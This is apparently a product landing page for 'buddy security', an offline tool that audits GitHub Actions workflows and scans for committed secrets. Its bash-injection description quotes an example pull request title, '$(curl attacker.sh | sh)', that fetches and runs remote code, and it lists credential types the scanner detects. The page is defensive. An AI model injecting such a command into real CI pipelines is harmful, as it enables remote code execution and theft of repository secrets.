---
layout: home
title: Workflow Security
description: Static analysis for the supply-chain footguns that live in .github/workflows — bash injection, excessive permissions, unpinned actions, self-hosted exposure — plus a secret scanner that needs no key.

hero:
  name: "workflow security"
  text: "Your CI is the softest target you own"
  tagline: "A workflow that interpolates a pull request title into a shell, or grants write-all, or pins an action to a tag someone else can move, is a supply-chain incident waiting for a motivated stranger. buddy security finds them in seconds, offline."
  announcement:
    tag: "offline"
    text: "No API key, no network, no telemetry"
    link: "#offline"
  actions:
    - theme: brand
      text: Install Buddy
      link: /install
    - theme: alt
      text: Local review
      link: /features/local-review
    - theme: alt
      text: Security & compliance
      link: /use-cases/security-compliance
  code:
    - file: "buddy security"
      lang: "ascii"
      content: |
        $ buddy security

                     __
            (\,------'()'--o    auditing 7 workflows
             (_    ___    /~"   .github/workflows
              (_)_)  (_)_)

          error   bash-injection
            ci.yml — job `label`, step 2:
            `github.event.pull_request.title` is
            interpolated into a shell.

          error   excessive-permissions
            release.yml grants `permissions: write-all`.

          warning unpinned-action
            deploy.yml — `some-org/deploy@main` is
            pinned to a mutable ref.

          warning missing-timeout
            e2e.yml — job `browser` has no
            `timeout-minutes`.

          2 errors, 2 warnings
        $ echo $?
        1
    - file: "in a workflow"
      lang: "yaml"
      content: |
        name: Workflow Audit
        on:
          push:
            paths: ['.github/workflows/**']
          pull_request:
            paths: ['.github/workflows/**']

        jobs:
          audit:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            permissions:
              contents: read
            steps:
              - uses: actions/checkout@v4
              - uses: oven-sh/setup-bun@v2
              # annotations land on the changed lines
              - run: bunx @buddysh/buddy security

features:
  - title: "bash-injection"
    icon: "💉"
    span: 2
    details: "An expression interpolated straight into a run: block is executed by the shell. A pull request title of `$(curl attacker.sh | sh)` is not a hypothetical — it is the most exploited pattern in GitHub Actions, and it is one grep away from being found."
  - title: "dangerous-pull-request-target"
    icon: "☢️"
    details: "pull_request_target runs with the base repository's secrets. A job that then checks out the PR author's code hands those secrets to a stranger's script."
  - title: "excessive-permissions"
    icon: "🔓"
    details: "Flags write-all at workflow or job level, and workflows that declare no top-level permissions: at all — where the default is whatever the repository happens to be set to today."
  - title: "unpinned-action"
    icon: "📌"
    details: "An action with no version, or pinned to a branch or tag its owner can move under you. Whoever controls that ref controls a step in your pipeline."
  - title: "self-hosted-exposure"
    icon: "🖥️"
    details: "A bare runs-on: self-hosted with no distinguishing labels can pick up jobs from anywhere the runner is registered — including a fork's pull request."
  - title: "missing-timeout"
    icon: "⏱️"
    details: "A job with no timeout-minutes can burn an entire billing window on a hung step, and a hung runner is a runner not available to anyone else."
---

## One command, three formats

```bash
buddy security                       # pretty, for a terminal
buddy security --format json         # for a dashboard
buddy security --format github       # ::error annotations
buddy security --ignore missing-timeout,unpinned-action
buddy security path/to/repo
```

On a GitHub runner the format defaults to `github`, so findings arrive as annotations on the offending lines without you configuring anything. It exits non-zero when a rule at error severity fires, which is what makes it a gate.

## Secrets, before they leave your machine {#offline}

The secret scanner is part of every review — including `buddy review --light`, which runs with no API key and no network:

| Detected | |
| --- | --- |
| AWS access key IDs | GitHub tokens (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`) |
| Anthropic API keys | OpenAI API keys |
| Google API keys | Slack tokens |
| Private key blocks | npm access tokens |

The rule set is deliberately narrow. Broad entropy heuristics are left out on purpose: a secret scanner that cries wolf gets muted, and a muted scanner catches nothing. Matches inside `.example` and `.sample` files, fixtures and mocks are treated as examples, and lines marked `placeholder`, `dummy`, `redacted` or `your_key` are not reported.

Because it needs no external tool and no key, it is the one analyzer guaranteed to be available — a committed credential is the finding least affordable to miss because a toolchain was absent.

## Put it in the pre-commit hook

```bash
buddy review --staged --light --fail-on major
```

Secret scanning, workflow auditing, `actionlint`, `shellcheck`, `hadolint`, `markdownlint` and syntax checks, with a non-zero exit that blocks the commit. No key, no network, no per-seat cost.

## And the dependencies

The other half of supply-chain risk is what you install. Buddy pulls advisories from [OSV.dev](https://osv.dev) for every ecosystem it supports, flags base images past end of life, and can [block a merge](/features/merge-gates) on a vulnerable, deprecated or wrongly-licensed dependency:

```ts
gates: {
  dependencyGate: {
    mode: 'error',
    licenseAllowlist: ['MIT', 'Apache-2.0', 'ISC', 'BSD-3-Clause'],
    blockVulnerable: true,
    blockDeprecated: true,
    blockEol: true,
  },
}
```

## Related

[Local review](/features/local-review) · [Merge gates](/features/merge-gates) · [Your CI, your keys](/features/self-hosted) · [Security & compliance](/use-cases/security-compliance)
